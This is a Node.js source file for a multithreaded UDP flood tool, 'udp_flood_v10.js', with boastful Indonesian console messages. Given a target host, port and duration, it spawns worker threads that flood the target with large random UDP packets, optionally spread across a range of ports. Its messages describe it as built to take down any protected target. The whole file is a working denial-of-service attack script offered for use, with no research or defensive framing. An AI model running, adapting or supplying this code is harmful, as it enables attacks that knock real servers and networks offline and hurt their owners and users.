const dgram = require('dgram');
const { argv } = process;
const dns = require('dns');
const crypto = require('crypto');
const os = require('os');
const { Worker, isMainThread, parentPort, workerData } = require('worker_threads');

// --- Worker Thread Logic ---
if (!isMainThread) {
    const { workerId, targetIp, targetPort, durationMs, numWorkers, portRange } = workerData;
    const workerSocket = dgram.createSocket('udp4');
    workerSocket.unref();

    let packetCounterWorker = 0;

    const sendExtremePacket = () => {
        const payloadSize = Math.floor(Math.random() * (60000 - 10) + 10); 
        const payload = crypto.randomBytes(payloadSize);

        let currentTargetPort = targetPort;
        if (portRange > 0) {
            const minPort = Math.max(1, targetPort - portRange);
            const maxPort = Math.min(65535, targetPort + portRange);
            currentTargetPort = Math.floor(Math.random() * (maxPort - minPort + 1)) + minPort;
        }

        workerSocket.send(payload, 0, payload.length, currentTargetPort, targetIp, (err) => {
            if (err) {
            } else {
                 packetCounterWorker++;
                 parentPort.postMessage({ type: 'packet_sent', size: payload.length });
            }
        });
    };

    const startWorkerBrutalFloodLoop = (endTime) => {
        if (Date.now() < endTime) { 
             sendExtremePacket();
             setImmediate(() => startWorkerBrutalFloodLoop(endTime));
         } else {
             workerSocket.close();
             parentPort.postMessage({ type: 'worker_done', packets: packetCounterWorker });
         }
    };

    parentPort.on('message', (msg) => {
        if (msg.type === 'stop') {
             workerSocket.close();
             parentPort.postMessage({ type: 'worker_done', packets: packetCounterWorker });
        }
    });

    startWorkerBrutalFloodLoop(workerData.endTime);
}

else {
    if (argv.length < 5 || argv.length > 7) {
        console.error('🤬 Usage: node udp_flood_v10.js <target_url_or_ip> <port> <duration_seconds> [optional_num_workers = CPU_Cores] [optional_port_range = 0]');
        console.error('Contoh (SANGAT MEMBERATKAN SISTEM!): node udp_flood_v10.js targetfinal.net 80 60 16 100'); // Nyerang 16 worker, port 80 +/- 100
        console.error('Ini serangan UDP_FLOOD PALING BRUTAL dengan Multisocket, Opsi Worker & Ukuran Ekstrem!');
        console.error('INI DIRANCANG UNTUK MENDORONG BATASAN SISTEM DAN TARGET. SADARI RISIKONYA!');
        process.exit(1);
    }

    const targetHost = argv[2];
    const targetPort = parseInt(argv[3]);
    const durationSeconds = parseInt(argv[4]);
    const durationMs = durationSeconds * 1000;
    const endTime = Date.now() + durationMs;
    const numWorkers = argv[5] ? parseInt(argv[5]) : os.cpus().length;
    const portRange = argv[6] ? parseInt(argv[6]) : 0;

    if (isNaN(targetPort) || targetPort <= 0 || targetPort > 65535) {
        console.error('🚨 Port target nggak valid, coeg! Harus angka antara 1 dan 65535.');
        process.exit(1);
    }
    if (isNaN(durationSeconds) || durationSeconds <= 0) {
        console.error('⏳ Durasi nggak valid, bro! Harus angka positif.');
        process.exit(1);
    }
     if (isNaN(numWorkers) || numWorkers <= 0) {
        console.error('⚙️ Jumlah worker nggak valid, coeg! Harus angka positif.');
        process.exit(1);
    }
    if (isNaN(portRange) || portRange < 0 || portRange > 65535) {
        console.error('🎯 Rentang port nggak valid! Harus angka positif (0 jika hanya port target).');
        process.exit(1);
    }


    const workers = [];
    let totalPacketsSent = 0;

    console.log(`💀 TARGET FINAL BRUTAL: ${targetHost}:${targetPort} (Rentang Port ± ${portRange})`);
    console.log(`⏳ Durasi Serangan: ${durationSeconds} detik.`);
    console.log(`🧠 Menggunakan ${numWorkers} Worker Thread PALING brutal paralel...`);
    console.log('☄️ MULAI SERANGAN (V10)!!! Mengirim paket UDP ukuran EKSTREM, payload ganas, acak port...');
    console.log('MENGINCAR JAMINAN DOWN proteksi canggih APAPUN CARANYA!!! SIAPKAN BANDWIDTH NERAKA!!!');

    dns.lookup(targetHost, (err, address, family) => {
        if (err) {
            console.error(`❌ Gagal resolusi hostname ${targetHost}: ${err.message}`);
            process.exit(1);
        }

        const targetIp = address;

        // Buat dan jalankan Worker Threads
        for (let i = 0; i < numWorkers; i++) {
            const worker = new Worker(__filename, {
                workerData: {
                    workerId: i,
                    targetIp: targetIp,
                    targetPort: targetPort,
                    durationMs: durationMs, // Berikan durasi total ke worker
                    endTime: endTime, // Berikan waktu berakhir ke worker
                    portRange: portRange // Berikan info rentang port
                }
            });
            workers.push(worker);

            // Handle pesan dari worker
            worker.on('message', (msg) => {
                if (msg.type === 'packet_sent') {
                    totalPacketsSent++;
                    // console.log(`Main: Total packets sent: ${totalPacketsSent}`); // Aktifkan kalau mau lihat total paket live (BAKAL NGEBLOK)
                 } else if (msg.type === 'worker_done') {
                    console.log(`⚙️ Worker ${msg.workerId} selesai. Mengirim ${msg.packets} paket.`);
                    // Cek kalau semua worker udah selesai
                    let allWorkersDone = true;
                     for (const w of workers) {
                         // Cek apakah worker masih ada dan belum selesai
                         if (w && typeof w.postMessage === 'function') {
                             allWorkersDone = false;
                              break;
                         }
                     }
                     if (allWorkersDone) {
                         console.log(`\n✅ SEMUA WORKER SELESAI! Serangan berakhir.`);
                         console.log(`💀 Total paket dikirim dari semua worker (estimasi): ${totalPacketsSent}`);
                         process.exit(0);
                     }
                }
            });

            // Handle error worker
            worker.on('error', (err) => {
                console.error(`‼️ Error di Worker ${i}: ${err.message}`);
                // Tandai worker ini error, mungkin perlu logic retry atau abaikan
                const index = workers.indexOf(worker);
                if (index > -1) {
                     workers[index] = { erred: true }; // Tandai worker sebagai error
                 }
                 // Cek kalau semua worker udah selesai/error
                 let allWorkersFinished = true;
                 for (const w of workers) {
                      if (w && typeof w.postMessage === 'function') {
                         allWorkersFinished = false;
                          break;
                     }
                 }
                 if (allWorkersFinished) {
                    console.log(`\n⚠️ SEMUA WORKER SELESAI/ERROR! Serangan berakhir (kemungkinan karena error).`);
                    console.log(`💀 Total paket dikirim dari semua worker (estimasi): ${totalPacketsSent}`);
                    process.exit(1); // Keluar dengan kode error
                 }

            });

             worker.on('exit', (code) => {
                if (code !== 0) {
                    console.error(`⚠️ Worker ${i} keluar dengan kode ${code} secara tidak normal.`);
                    // Handle worker exit yang tidak normal
                } else {
                     console.log(`⚙️ Worker ${i} keluar normal.`);
                }
                 // Tandai worker sebagai selesai
                 const index = workers.indexOf(worker);
                 if (index > -1) {
                     workers[index] = { exited: true };
                 }
                 // Cek kalau semua worker udah selesai/exited
                 let allWorkersFinished = true;
                 for (const w of workers) {
                     if (w && typeof w.postMessage === 'function') {
                         allWorkersFinished = false;
                         break;
                     }
                 }
                 if (allWorkersFinished) {
                     console.log(`\n✅ SEMUA WORKER SELESAI/EXITED! Serangan berakhir.`);
                     console.log(`💀 Total paket dikirim dari semua worker (estimasi): ${totalPacketsSent}`);
                     process.exit(0);
                 }
            });
        }

        // Set timeout global untuk kirim sinyal stop ke worker jika durasi habis
        setTimeout(() => {
            console.log(`\n⏳ Durasi ${durationSeconds} detik habis. Mengirim sinyal stop ke worker...`);
            workers.forEach(worker => {
                 if (worker && typeof worker.postMessage === 'function') { // Pastikan worker masih aktif
                     worker.postMessage({ type: 'stop' });
                 }
            });
            // Main thread tetap jalan sampe semua worker exit
        }, durationMs);

    });

    // Tangani Ctrl+C di main thread (kasih sinyal stop ke worker)
    process.on('SIGINT', () => {
        console.log(`\n✋ Sinyal SIGINT diterima (Ctrl+C) di Main Thread. Menghentikan serangan brutal...`);
        workers.forEach(worker => {
             if (worker && typeof worker.postMessage === 'function') { // Pastikan worker masih aktif
                 worker.postMessage({ type: 'stop' });
             }
         });
         // Set timeout darurat kalau worker nggak mau berhenti setelah 5 detik
         setTimeout(() => {
             console.log("Worker sepertinya macet, memaksa keluar...");
            // Loop semua worker dan terminasi paksa
            workers.forEach(worker => {
                 if (worker && typeof worker.terminate === 'function') {
                     worker.terminate(); // Terminasi paksa
                 }
             });

             process.exit(1); // Keluar dengan kode error
         }, 5000);
    });
}